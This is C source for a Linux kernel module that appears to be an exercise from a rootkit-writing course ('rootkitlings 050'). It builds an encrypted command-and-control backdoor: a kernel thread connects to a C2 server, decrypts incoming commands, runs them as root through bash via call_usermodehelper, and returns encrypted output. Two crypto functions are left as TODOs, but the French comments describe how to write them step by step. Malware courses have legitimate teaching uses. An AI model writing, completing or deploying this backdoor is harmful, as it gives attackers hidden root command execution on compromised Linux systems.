#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/fs.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <crypto/skcipher.h>
#include <linux/scatterlist.h>
#include <linux/byteorder/generic.h>
#include "protocol.h"

#define SERVER_IP    "127.0.0.1"
#define SERVER_PORT  4444
#define OUTPUT_FILE  "/tmp/rkl_out"

static const u8 aes_key[AES_KEY_SIZE] = "rootkitlingskey!";
static struct task_struct *c2_thread = NULL;
static struct socket *sock = NULL;

/* --- low-level helpers (provided) --- */

static int ksend(struct socket *s, const void *buf, size_t len)
{
	struct msghdr msg = {0};
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(s, &msg, &vec, 1, len);
}

static int krecv(struct socket *s, void *buf, size_t len)
{
	struct msghdr msg = {0};
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(s, &msg, &vec, 1, len, 0);
}

static int pack_msg(char *out, __u8 type, const char *data, __u32 data_len)
{
	__be32 net_len = htonl(data_len);

	out[0] = type;
	memcpy(out + 1, &net_len, 4);
	if (data_len > 0 && data)
		memcpy(out + C2_HEADER_SIZE, data, data_len);
	return C2_HEADER_SIZE + data_len;
}

static int unpack_hdr(const char *buf, __u8 *type, __u32 *length)
{
	__be32 net_len;

	*type = buf[0];
	memcpy(&net_len, buf + 1, 4);
	*length = ntohl(net_len);
	return 0;
}

static int aes_crypt(const u8 *in, u8 *out, size_t len, const u8 *key,
		     const u8 *iv, bool encrypt)
{
	struct crypto_skcipher *tfm;
	struct skcipher_request *req;
	struct scatterlist sg;
	u8 iv_copy[AES_BLOCK];
	int ret;

	tfm = crypto_alloc_skcipher("cbc(aes)", 0, 0);
	if (IS_ERR(tfm))
		return PTR_ERR(tfm);

	crypto_skcipher_setkey(tfm, key, AES_KEY_SIZE);
	req = skcipher_request_alloc(tfm, GFP_KERNEL);
	if (!req) {
		crypto_free_skcipher(tfm);
		return -ENOMEM;
	}

	memcpy(out, in, len);
	sg_init_one(&sg, out, len);
	memcpy(iv_copy, iv, AES_BLOCK);
	skcipher_request_set_crypt(req, &sg, &sg, len, iv_copy);

	ret = encrypt ? crypto_skcipher_encrypt(req) : crypto_skcipher_decrypt(req);

	skcipher_request_free(req);
	crypto_free_skcipher(tfm);
	return ret;
}

static int exec_cmd(const char *cmd)
{
	char full_cmd[512];
	char *argv[] = {"/bin/bash", "-c", full_cmd, NULL};
	char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

	snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2>&1", cmd, OUTPUT_FILE);
	return call_usermodehelper("/bin/bash", argv, envp, UMH_WAIT_PROC);
}

static int read_output(char *buf, size_t max_len)
{
	struct file *f;
	loff_t pos = 0;
	int ret;

	f = filp_open(OUTPUT_FILE, O_RDONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);

	ret = kernel_read(f, buf, max_len - 1, &pos);
	filp_close(f, NULL);
	if (ret > 0)
		buf[ret] = '\0';
	return ret;
}

/* --- crypto wrappers (your work) --- */

static int recv_and_decrypt(struct socket *s, char *out, __u32 data_len)
{
	// TODO(rootkitlings): recois data_len octets et dechiffre.
	//
	// Le format des data: [IV (16 octets)] [ciphertext (reste)]
	//
	// 1. Alloue un buffer temporaire (data_len octets) avec kmalloc
	// 2. krecv(s, tmp, data_len)
	// 3. Les 16 premiers octets sont l'IV: memcpy(iv, tmp, AES_BLOCK)
	// 4. Le ciphertext est tmp + AES_BLOCK, taille = data_len - AES_BLOCK
	// 5. aes_crypt(tmp + AES_BLOCK, out, data_len - AES_BLOCK, aes_key, iv, false)
	// 6. out[data_len - AES_BLOCK] = '\0'
	// 7. Retire le padding PKCS7: u8 pad = out[data_len - AES_BLOCK - 1];
	//    si pad <= AES_BLOCK, out[data_len - AES_BLOCK - pad] = '\0';
	// 8. kfree(tmp)
	//
	// 8 lignes de code (plus les declarations).

	return -1;
}

static int encrypt_and_send(struct socket *s, __u8 msg_type,
			    const char *plain, size_t plain_len)
{
	// TODO(rootkitlings): chiffre et envoie via le protocole TLV.
	//
	// 1. Calcule padded_len: arrondi au multiple de AES_BLOCK superieur
	//    padded_len = ((plain_len + AES_BLOCK - 1) / AES_BLOCK) * AES_BLOCK
	//
	// 2. Alloue padded (padded_len octets), copie plain, ajoute padding PKCS7
	//
	// 3. Genere un IV aleatoire: u8 iv[AES_BLOCK]; get_random_bytes(iv, AES_BLOCK);
	//
	// 4. Chiffre: aes_crypt(padded, encrypted, padded_len, aes_key, iv, true)
	//
	// 5. Construis le data field: [IV (16)] [ciphertext (padded_len)]
	//    Taille totale des data = AES_BLOCK + padded_len
	//
	// 6. pack_msg et ksend
	//
	// 7. Libere les buffers
	//
	// 8 lignes de code (plus les declarations).

	return -1;
}

/* --- C2 thread --- */

static int c2_thread_fn(void *data)
{
	struct sockaddr_in addr;
	char send_buf[C2_HEADER_SIZE + AES_BLOCK + C2_MAX_DATA];
	char recv_buf[C2_HEADER_SIZE];
	char cmd_buf[C2_MAX_DATA];
	char out_buf[C2_MAX_DATA];
	__u8 msg_type;
	__u32 msg_len;
	int ret, total;

	ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret < 0)
		return ret;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SERVER_PORT);
	addr.sin_addr.s_addr = in_aton(SERVER_IP);

	ret = kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
	if (ret < 0) {
		sock_release(sock);
		sock = NULL;
		return ret;
	}

	pr_info("rootkitlings/050: connected to encrypted C2 server\n");

	while (!kthread_should_stop()) {
		/* Send heartbeat (unencrypted, just a header) */
		total = pack_msg(send_buf, C2_HEARTBEAT, NULL, 0);
		ksend(sock, send_buf, total);

		/* Recv header */
		ret = krecv(sock, recv_buf, C2_HEADER_SIZE);
		if (ret <= 0)
			break;
		unpack_hdr(recv_buf, &msg_type, &msg_len);

		if (msg_type == C2_CMD_REQUEST && msg_len > AES_BLOCK) {
			/* Receive and decrypt command */
			ret = recv_and_decrypt(sock, cmd_buf, msg_len);
			if (ret < 0) {
				pr_err("rootkitlings/050: decrypt failed\n");
				break;
			}

			pr_info("rootkitlings/050: exec: %s\n", cmd_buf);
			exec_cmd(cmd_buf);

			ret = read_output(out_buf, sizeof(out_buf));
			if (ret > 0) {
				encrypt_and_send(sock, C2_CMD_RESPONSE,
						 out_buf, strlen(out_buf));
				pr_info("rootkitlings/050: sent encrypted response\n");
			}
		} else {
			break;
		}
	}

	pr_info("rootkitlings/050: C2 loop ended\n");
	return 0;
}

static int __init cryptoc2_init(void)
{
	c2_thread = kthread_run(c2_thread_fn, NULL, "rootkitlings050");
	if (IS_ERR(c2_thread))
		return PTR_ERR(c2_thread);
	pr_info("rootkitlings/050: encrypted C2 thread started\n");
	return 0;
}

static void __exit cryptoc2_exit(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
	}
	pr_info("rootkitlings/050: cleaned up\n");
}

module_init(cryptoc2_init);
module_exit(cryptoc2_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkitlings 050: encrypted C2");
